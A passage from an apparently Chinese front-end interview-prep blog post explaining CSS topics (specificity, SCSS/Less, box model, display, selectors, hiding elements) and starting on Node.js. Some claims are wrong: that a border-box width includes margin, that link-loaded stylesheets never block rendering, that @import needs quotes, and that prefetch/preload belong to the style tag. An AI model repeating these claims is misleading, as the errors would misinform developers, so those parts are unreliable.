数量、类&#x2F;属性&#x2F;伪类数量和标签数量。例如，选择器 <code>#header .title</code> 的特定性是 <code>0, 1, 1</code>，因为它包含一个类选择器和一个标签选择器。</p><p>如果两个样式规则具有相同的特定性，那么后面定义的规则将覆盖先前的规则。如果两个规则都使用了 <code>!important</code>，则 <code>!important</code> 规则将具有更高的优先级。</p><p>在实际开发中，了解选择器的优先级可以帮助你更好地控制样式的应用和覆盖，但应该尽量避免过度使用 <code>!important</code>，以保持样式表的可维护性。</p><h3 id="7、scss-less-优势"><a href="#7、scss-less-优势" class="headerlink" title="7、scss less 优势"></a>7、scss less 优势</h3><p>SCSS 和 Less 都是预处理器（CSS预处理语言），它们在原生CSS的基础上提供了一些便捷的功能和语法，使得样式的编写和维护更加容易。下面是它们的一些优势：</p><h5 id="SCSS（Sass）"><a href="#SCSS（Sass）" class="headerlink" title="SCSS（Sass）"></a>SCSS（Sass）</h5><ol><li><p><strong>丰富的特性：</strong> SCSS 提供了丰富的特性，如变量、嵌套、混合（Mixins）、继承、条件语句等，这些功能可以提高代码的可维护性和可读性。</p></li><li><p><strong>成熟的生态系统：</strong> Sass（SCSS的前身）已经存在了很长时间，有一个成熟的生态系统，包括大量的第三方库和工具，以及社区支持。</p></li><li><p><strong>变量和嵌套：</strong> SCSS 允许使用变量来保存颜色、字体大小等属性值，同时支持嵌套规则，可以更清晰地组织样式。</p></li><li><p><strong>混合（Mixins）：</strong> SCSS 中的混合允许将一组样式属性定义为可重用的函数，可以在多个地方引用。</p></li><li><p><strong>继承：</strong> SCSS 支持样式的继承，可以减少重复的样式定义。</p></li><li><p><strong>条件语句：</strong> SCSS 具有条件语句，可以根据不同条件应用不同的样式。</p></li></ol><h5 id="Less"><a href="#Less" class="headerlink" title="Less"></a>Less</h5><ol><li><p><strong>简洁的语法：</strong> Less 的语法相对较简单，更接近原生CSS，对于新手来说学习曲线较低。</p></li><li><p><strong>易于集成：</strong> 因为 Less 的语法更接近原生CSS，所以可以较容易地集成到现有项目中，无需太多修改。</p></li><li><p><strong>快速编译：</strong> Less 的编译速度相对较快，这对于大型项目和需要快速反馈的开发过程可能更有优势。</p></li><li><p><strong>支持 JavaScript 表达式：</strong> Less 允许在样式中使用 JavaScript 表达式，增加了样式表达能力。</p></li></ol><p>总体来说，选择使用 SCSS 还是 Less 取决于个人或团队的偏好以及项目的需求。SCSS 提供了更丰富的功能和更高的可维护性，适用于大型复杂项目或需要更高级样式功能的场景。Less 简单易学，适合快速开发和集成到现有项目中。无论选择哪种预处理器，它们都有助于提高样式表的可维护性和可读性。</p><h3 id="8、css中outline和border区别"><a href="#8、css中outline和border区别" class="headerlink" title="8、css中outline和border区别"></a>8、css中outline和border区别</h3><p><code>outline</code> 和 <code>border</code> 是 CSS 中用于绘制元素边框和轮廓的两种不同属性，它们在用途和表现上有一些重要的区别。</p><h5 id="border-属性："><a href="#border-属性：" class="headerlink" title="border 属性："></a><code>border</code> 属性：</h5><ul><li><code>border</code> 用于定义元素的边框，它是一个复合属性，包括 <code>border-width</code>（边框宽度）、<code>border-style</code>（边框样式）、<code>border-color</code>（边框颜色）这三个子属性。</li><li><code>border</code> 属性是在元素的内部内容框的外部绘制的，它占据了元素的布局空间。</li><li><code>border</code> 可以分别定义上、下、左、右四个边的边框样式、宽度和颜色。</li><li><code>border</code> 可以用于绘制元素的实际边框，可以设置不同的样式，如实线、虚线等，以及不同的颜色和宽度。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#000</span>; <span class="hljs-comment">/* 设置2像素宽的实线边框，颜色为黑色 */</span><br></code></pre></td></tr></table></figure><h5 id="outline-属性："><a href="#outline-属性：" class="headerlink" title="outline 属性："></a><code>outline</code> 属性：</h5><ul><li><code>outline</code> 用于定义元素的轮廓，它也是一个复合属性，包括 <code>outline-width</code>（轮廓宽度）、<code>outline-style</code>（轮廓样式）、<code>outline-color</code>（轮廓颜色）这三个子属性。</li><li><code>outline</code> 属性不占据元素的布局空间，不影响元素的大小和位置。</li><li><code>outline</code> 主要用于可访问性和用户体验方面，它通常用于高亮标记具有焦点的元素（例如表单元素）或者在用户点击链接时显示虚线框。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-attribute">outline</span>: <span class="hljs-number">2px</span> dashed <span class="hljs-number">#00f</span>; <span class="hljs-comment">/* 设置2像素宽的虚线轮廓，颜色为蓝色 */</span><br></code></pre></td></tr></table></figure><h5 id="区别总结："><a href="#区别总结：" class="headerlink" title="区别总结："></a>区别总结：</h5><ul><li><code>border</code> 用于定义元素的实际边框，占据布局空间，可以设置边框样式、宽度和颜色。</li><li><code>outline</code> 用于定义元素的轮廓，不占据布局空间，通常用于高亮焦点元素或者为链接添加虚线框。</li><li><code>outline</code> 主要用于可访问性和用户体验，而 <code>border</code> 主要用于样式和布局。</li></ul><p>在使用时，根据具体的需求和效果选择使用 <code>border</code> 还是 <code>outline</code>。如果需要绘制实际边框并影响元素的布局，使用 <code>border</code>。如果只需绘制可见的轮廓用于视觉效果或可访问性，使用 <code>outline</code>。</p><h3 id="9、css导入页面样式用link和-import区别"><a href="#9、css导入页面样式用link和-import区别" class="headerlink" title="9、css导入页面样式用link和@import区别"></a>9、css导入页面样式用link和@import区别</h3><p>在 HTML 中导入页面样式，可以使用 <code>&lt;link&gt;</code> 元素和 <code>@import</code> CSS 规则两种不同的方法，它们之间有一些关键区别：</p><h5 id="lt-link-gt-元素："><a href="#lt-link-gt-元素：" class="headerlink" title="&lt;link&gt; 元素："></a><code>&lt;link&gt;</code> 元素：</h5><ol><li><strong>使用方法：</strong><ul><li><code>&lt;link&gt;</code> 是 HTML 元素，用于在 HTML 文档的 <code>&lt;head&gt;</code> 部分或外部链接的方式引入外部样式表文件。</li><li>它通过 <code>href</code> 属性指定要导入的 CSS 文件的路径。</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p><strong>加载方式：</strong></p><ul><li><code>&lt;link&gt;</code> 在页面加载时会同时加载样式表，不会阻塞页面的渲染。</li><li>由于是在 HTML 中直接引入，浏览器会并行加载多个样式表，提高了加载效率。</li></ul></li><li><p><strong>优点：</strong></p><ul><li>更加灵活，可以导入多个外部样式表，同时支持媒体查询，可以根据设备特性选择不同的样式表。</li></ul></li></ol><h5 id="import-CSS-规则："><a href="#import-CSS-规则：" class="headerlink" title="@import CSS 规则："></a><code>@import</code> CSS 规则：</h5><ol><li><strong>使用方法：</strong><ul><li><code>@import</code> 是 CSS 规则，用于在 CSS 文件中引入其他样式表文件。</li><li>它写在 CSS 文件的顶部，用法如下：</li></ul></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;styles.css&quot;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li><p><strong>加载方式：</strong></p><ul><li><code>@import</code> 会在解析到它的时候才开始加载被引入的样式表，因此可能会在页面的渲染过程中造成一些阻塞，特别是在较大样式表的情况下。</li></ul></li><li><p><strong>限制：</strong></p><ul><li><code>@import</code> 只能用于导入 CSS 文件，不能用于导入其他文件类型（如图片或字体）。</li><li><code>@import</code> 的语法要求更加严格，需要使用引号包裹 URL。</li></ul></li></ol><h5 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h5><ul><li><code>&lt;link&gt;</code> 元素通常更加灵活，适用于大多数情况，特别是在导入多个样式表、使用媒体查询或控制样式加载顺序时。</li><li><code>@import</code> 规则也可以导入样式，但可能在性能方面略有劣势，应谨慎使用，特别是在大型项目中。通常更适合在小规模或特定情况下使用。</li><li>在大多数情况下，推荐使用 <code>&lt;link&gt;</code> 元素来导入外部样式表，以获得更好的性能和灵活性。</li></ul><h3 id="10、display几种方式以及原理"><a href="#10、display几种方式以及原理" class="headerlink" title="10、display几种方式以及原理"></a>10、display几种方式以及原理</h3><p>CSS 中的 <code>display</code> 属性用于定义元素的外部框类型，它决定了元素在文档中的显示方式。以下是常见的 <code>display</code> 属性值及其原理：</p><ol><li><p>**<code>display: block;</code>**：</p><ul><li>原理：元素生成一个块级框，占据父元素的整个宽度，垂直方向上会另起一行。</li><li>例子：<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;h1&gt;</code> 等。</li></ul></li><li><p>**<code>display: inline;</code>**：</p><ul><li>原理：元素生成一个内联框，只占据其内容所需的宽度，不会另起一行。</li><li>例子：<code>&lt;span&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;strong&gt;</code> 等。</li></ul></li><li><p>**<code>display: inline-block;</code>**：</p><ul><li>原理：元素生成一个内联块级框，宽度由内容决定，但可以设置宽度、高度、边距等属性。</li><li>例子：常用于创建水平排列的块级元素，如按钮。</li></ul></li><li><p>**<code>display: none;</code>**：</p><ul><li>原理：元素不会在页面上显示，占据的空间会被移除，相当于元素被隐藏。</li><li>例子：通常用于通过 JavaScript 来控制元素的显示和隐藏。</li></ul></li><li><p>**<code>display: flex;</code>**：</p><ul><li>原理：元素变成一个 Flex 容器，其子元素成为 Flex 项目，可以通过设置容器和项目的属性来实现灵活的布局。</li><li>例子：用于创建灵活的水平或垂直布局。</li></ul></li><li><p>**<code>display: grid;</code>**：</p><ul><li>原理：元素变成一个 Grid 容器，可以通过设置容器和项目的属性来实现网格布局。</li><li>例子：用于创建复杂的网格布局。</li></ul></li><li><p>**<code>display: table;</code>, <code>display: table-row;</code>, <code>display: table-cell;</code>**：</p><ul><li>原理：模拟表格结构，元素表现为表格、表格行和表格单元格。</li><li>例子：用于实现表格布局。</li></ul></li><li><p>**<code>display: list-item;</code>**：</p><ul><li>原理：元素表现为列表项，通常与 <code>list-style</code> 属性一起使用。</li><li>例子：用于定义列表项的样式。</li></ul></li><li><p>**<code>display: inline-flex;</code>, <code>display: inline-grid;</code>**：</p><ul><li>原理：类似于 <code>display: flex;</code> 和 <code>display: grid;</code>，但生成的容器是内联的，而不是块级的。</li></ul></li><li><p>**<code>display: inherit;</code>, <code>display: initial;</code>, <code>display: unset;</code>**：</p><ul><li>这些值是用于继承、重置或取消元素的 <code>display</code> 属性。</li></ul></li></ol><p>每种 <code>display</code> 属性值都有其自身的布局特性和用途，根据项目的需求和设计目标选择合适的值是很重要的。同时，可以通过组合不同的 <code>display</code> 属性值来创建复杂的布局。例如，可以在 Flex 容器内部使用 <code>display: flex;</code> 和 <code>display: inline-block;</code> 来实现水平和垂直的灵活布局。</p><h3 id="11、CSS盒模型介绍一下"><a href="#11、CSS盒模型介绍一下" class="headerlink" title="11、CSS盒模型介绍一下"></a>11、CSS盒模型介绍一下</h3><p>CSS 盒模型（Box Model）是用来描述页面上的每个 HTML 元素都被视为一个矩形的模型。这个模型由四个部分组成，它们决定了元素在页面中所占的空间、大小和布局。</p><p>CSS 盒模型的四个部分如下：</p><ol><li><p><strong>内容区域（Content）：</strong> 这是元素内部实际包含内容的区域，例如文本、图片或其他子元素。内容区域的大小由元素的 <code>width</code> 和 <code>height</code> 属性来确定。</p></li><li><p><strong>内边距区域（Padding）：</strong> 内边距区域是内容区域周围的空间，它用于分隔内容和边框之间的距离。内边距的大小由 <code>padding</code> 属性来控制。</p></li><li><p><strong>边框区域（Border）：</strong> 边框区域是内边距区域的外部边界，用于包围元素的内容和内边距。边框的大小、样式和颜色由 <code>border</code> 属性来定义。</p></li><li><p><strong>外边距区域（Margin）：</strong> 外边距区域是边框区域的外部空间，用于分隔元素与其周围元素之间的距离。外边距的大小由 <code>margin</code> 属性来控制。</p></li></ol><p>在默认情况下，CSS 盒模型的宽度和高度属性（<code>width</code> 和 <code>height</code>）仅指的是内容区域的宽度和高度，而不包括内边距、边框和外边距。这意味着，如果你设置一个元素的宽度为 100px，那么元素实际占据的空间可能会大于 100px，因为内边距、边框和外边距也会占据一定的空间。</p><p>如果需要考虑元素的总占用空间，包括内边距、边框和外边距，可以使用 <code>box-sizing</code> 属性来改变盒模型的行为。将 <code>box-sizing</code> 设置为 <code>border-box</code> 会使宽度和高度属性包括内边距和边框，而不会额外增加元素的大小。</p><p>例如，以下是设置盒模型为 <code>border-box</code> 的示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个元素的总宽度将为 100px，包括内容、内边距、边框和外边距。 CSS 盒模型是构建 Web 页面布局的重要概念，了解它可以帮助你更好地控制和调整元素的大小和间距。</p><h5 id="标准盒模型和IE盒模型分别如何计算宽高"><a href="#标准盒模型和IE盒模型分别如何计算宽高" class="headerlink" title="标准盒模型和IE盒模型分别如何计算宽高"></a>标准盒模型和IE盒模型分别如何计算宽高</h5><p>标准盒模型和 IE 盒模型在计算元素的宽度和高度时有不同的方式。</p><p>**标准盒模型 通过 getComputedStyle 获取到的宽高是 content 的值； **</p><p><strong>IE盒模型 通过 getComputedStyle 获取到的宽高 &#x3D; border + padding + content</strong>，不包括外边距；</p><p>为了控制使用哪种盒模型，可以通过 CSS 的 <code>box-sizing</code> 属性来设置：</p><ul><li><p>若要使用标准盒模型（W3C 盒模型），可以设置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">box-sizing</span>: content-box;<br></code></pre></td></tr></table></figure></li><li><p>若要使用 IE 盒模型（怪异盒模型），可以设置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">box-sizing</span>: border-box;<br></code></pre></td></tr></table></figure></li></ul><p>默认情况下，大多数现代浏览器采用标准盒模型，但在某些情况下，可能需要使用 IE 盒模型以兼容特定的布局需求或遗留代码。在选择盒模型时，需要根据具体的项目和需求来决定哪种模型更合适。</p><h3 id="12、如何隐藏一个属性"><a href="#12、如何隐藏一个属性" class="headerlink" title="12、如何隐藏一个属性"></a>12、如何隐藏一个属性</h3><p>隐藏页面元素可以通过多种方法实现，具体取决于你的需求和使用的技术。以下是一些常见的方法：</p><ol><li><p><strong>CSS <code>display</code> 属性：</strong></p><ul><li>使用 CSS 的 <code>display</code> 属性可以隐藏元素。你可以将元素的 <code>display</code> 设置为 <code>none</code> 来完全隐藏元素，或者设置为 <code>block</code>、<code>inline</code>、<code>inline-block</code> 等值来显示或隐藏元素。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS <code>visibility</code> 属性：</strong></p><ul><li>使用 CSS 的 <code>visibility</code> 属性可以隐藏元素，但元素仍占据页面空间。你可以将元素的 <code>visibility</code> 设置为 <code>hidden</code> 来隐藏元素。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素但保留占位 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS <code>opacity</code> 属性：</strong></p><ul><li>使用 CSS 的 <code>opacity</code> 属性可以将元素变为透明，但元素仍然存在。你可以将元素的 <code>opacity</code> 设置为 <code>0</code> 来隐藏元素。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素但保留占位 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>HTML <code>hidden</code> 属性：</strong></p><ul><li>使用 HTML5 的 <code>hidden</code> 属性可以将元素隐藏，但它需要与 JavaScript 一起使用。将元素添加 <code>hidden</code> 属性将会隐藏它。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hidden-element&quot;</span> <span class="hljs-attr">hidden</span>&gt;</span>这个元素被隐藏了<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>JavaScript：</strong></p><ul><li>通过 JavaScript 编程控制元素的显示和隐藏，可以根据交互和条件来控制隐藏。以下是一个使用 JavaScript 控制隐藏的示例：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 隐藏元素</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;element-id&quot;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>;<br><br><span class="hljs-comment">// 显示元素</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;element-id&quot;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;block&quot;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSS <code>position</code> 属性：</strong></p><ul><li>通过设置元素的 <code>position</code> 属性为 <code>absolute</code> 或 <code>fixed</code>，然后通过设置 <code>top</code> 或 <code>left</code> 属性将元素移出视口范围，从而隐藏元素。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 隐藏元素，使其移出视口 */</span><br><span class="hljs-selector-class">.hidden-element</span> &#123;<br>    <span class="hljs-attribute">position</span>: absolute;<br>    <span class="hljs-attribute">top</span>: -<span class="hljs-number">9999px</span>;<br>    <span class="hljs-attribute">left</span>: -<span class="hljs-number">9999px</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>不同的隐藏方法适用于不同的使用场景。选择合适的方法取决于你的设计和功能需求。如果需要在用户交互中动态隐藏或显示元素，通常会使用 JavaScript 来实现。如果只是简单地静态隐藏元素，可以使用 CSS 或 HTML 属性。</p><h3 id="13、style标签prefetch和preload区别？"><a href="#13、style标签prefetch和preload区别？" class="headerlink" title="13、style标签prefetch和preload区别？"></a>13、style标签prefetch和preload区别？</h3><p><code>&lt;style&gt;</code>标签的prefetch和preload属性都用于优化CSS资源的加载，但它们有不同的行为和目的：</p><ul><li><code>prefetch</code>属性告诉浏览器这个CSS资源可能在未来的某个时刻需要被加载，但并不需要立即加载。浏览器会在空闲时间异步加载这个资源，以便在需要时能够立即使用。<code>prefetch</code>适用于那些当前不需要但是可能在未来会需要使用的资源。</li><li><code>preload</code>属性则告诉浏览器这个CSS资源在当前页面中必须被使用，因此应该立即加载和执行。浏览器会在主HTML文档下载和解析完成之前加载这个资源。<code>preload</code>适用于那些当前需要使用的资源。</li></ul><h3 id="14、css的选择器"><a href="#14、css的选择器" class="headerlink" title="14、css的选择器"></a>14、css的选择器</h3><p>CSS（层叠样式表）中的选择器用于选择要应用样式的HTML元素。CSS选择器允许你根据元素的类型、属性、关系等条件来选择一个或多个元素，从而为这些元素定义样式规则。以下是常见的CSS选择器：</p><ol><li><p><strong>元素选择器（Element Selector）：</strong> 通过HTML元素的名称来选择元素。例如，<code>p</code> 选择器将选择所有段落元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>类选择器（Class Selector）：</strong> 通过HTML元素的 <code>class</code> 属性来选择元素。以点 (<code>.</code>) 开头表示类选择器。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.my-class</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>ID选择器（ID Selector）：</strong> 通过HTML元素的 <code>id</code> 属性来选择元素。以井号 (<code>#</code>) 开头表示ID选择器。注意，ID应该在文档中是唯一的。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#my-id</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>通用选择器（Universal Selector）：</strong> 选择文档中的所有元素。通用选择器使用星号 (<code>*</code>) 表示。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>后代选择器（Descendant Selector）：</strong> 选择某个元素的后代元素。使用空格分隔不同层级的元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.parent-class</span> <span class="hljs-selector-class">.child-element</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>子元素选择器（Child Selector）：</strong> 选择某个元素的直接子元素。使用大于号 (<code>&gt;</code>) 表示。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.parent-class</span> &gt; <span class="hljs-selector-class">.direct-child</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>相邻兄弟选择器（Adjacent Sibling Selector）：</strong> 选择与另一个元素有相同父元素的相邻兄弟元素。使用加号 (<code>+</code>) 表示。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span> + <span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>通用兄弟选择器（General Sibling Selector）：</strong> 选择与另一个元素有相同父元素的所有兄弟元素。使用波浪号 (<code>~</code>) 表示。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h2</span> ~ <span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>属性选择器（Attribute Selector）：</strong> 选择具有特定属性或属性值的元素。</p><ul><li><p>选择具有特定属性的元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[data-attribute]</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>选择具有特定属性值的元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[data-attribute=<span class="hljs-string">&quot;value&quot;</span>]</span> &#123;<br>  <span class="hljs-comment">/* 样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>伪类选择器（Pseudo-class Selector）：</strong> 选择元素的特定状态或位置。伪类以冒号 (<code>:</code>) 开头。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-comment">/* 鼠标悬停状态下的样式规则 */</span><br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:first</span>-child &#123;<br>  <span class="hljs-comment">/* 第一个子元素的样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>伪元素选择器（Pseudo-element Selector）：</strong> 选择元素的特定部分。伪元素以双冒号 (<code>::</code>) 开头。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::first-line</span> &#123;<br>  <span class="hljs-comment">/* 第一行的样式规则 */</span><br>&#125;<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>  <span class="hljs-comment">/* 元素前面插入内容的样式规则 */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>这些是常见的CSS选择器，它们允许你根据不同的条件选择和定位HTML元素，以便为它们应用样式。根据项目需求，你可以组合多个选择器来更精确地选择目标元素。</p><h2 id="服务器相关篇"><a href="#服务器相关篇" class="headerlink" title="服务器相关篇"></a>服务器相关篇</h2><h3 id="1、介绍一下node-js"><a href="#1、介绍一下node-js" class="headerlink" title="1、介绍一下node.js"></a>1、介绍一下node.js</h3><p>Node.js 是一个基于 Chrome V8 JavaScript 引擎的运行时环境，用于构建服务器端和网络应用程序。它允许开发者使用 JavaScript 编程语言来编写服务器端代码，这在传统的前端开发中也广泛使用。以下是关于 Node.js 的一些重要信息和特点：</p><ol><li><p><strong>基于 JavaScript：</strong> Node.js 使用 JavaScript 作为主要的编程语言，这意味着前端开发者可以直接在服务器端编写代码，实现全栈开发。</p></li><li><p><strong>非阻塞和事件驱动：</strong> Node.js 的核心特点是非阻塞（non-blocking）和事件驱动（event-driven）的架构。这意味着它可以处理大量并发连接而不需要为每个连接创建新的线程，从而提高了应用程序的性能和可伸缩性。</p></li><li><p><strong>构建高性能服务器：</strong> Node.js 最初是设计用于构建高性能的网络服务器。它的事件循环机制和非阻塞 I&#x2F;O 使其非常适合处理实时、高并发的网络应用，如聊天应用、在线游戏、社交媒体等。</p></li><li><p><strong>模块化：</strong> Node.js 鼓励使用模块化编程，开发者可以轻松地创建、发布和使用模块。Node.js 自带一个模块系统，同时也有丰富的第三方模块可以使用，这些模块可以通过 npm（Node.js 包管理器）进行安装和管理。</p></li><li><p><strong>跨平台：</strong> Node.js 可以在多种操作系统上运行，包括 Windows、macOS 和各种 Linux 变体，这使得开发者可以在不同的平台上构建和部署应用程序。</p></li><li><p><strong>生态系统丰富：</strong> Node.js 拥有一个庞大而活跃的社区，开发者可以在社区中找到各种用于构建应用程序的库和框架，例如 Express.js（用于构建 Web 应用程序的框架）、Socket.io（用于实时通信的库）等。</p></li><li><p><strong>前端开发支持：</strong> Node.js 在前端开发中也非常有用，开发者可以使用它构建构建工具、任务自动化、静态文件服务器等。例如，常用的构建工具如Webpack和Babel都可以与Node.js配合使用。</p></li></ol><p>总的来说，Node.js 是一个强大的运行时环境，适用于构建各种类型的应用程序，从网络服务器到命令行工具，甚至是桌面应用程序。它的速度、可伸缩性和丰富的生态系统使其成为一个广泛使用的工具，特别是在构建实时和高性能的应用程序时。</p><h3 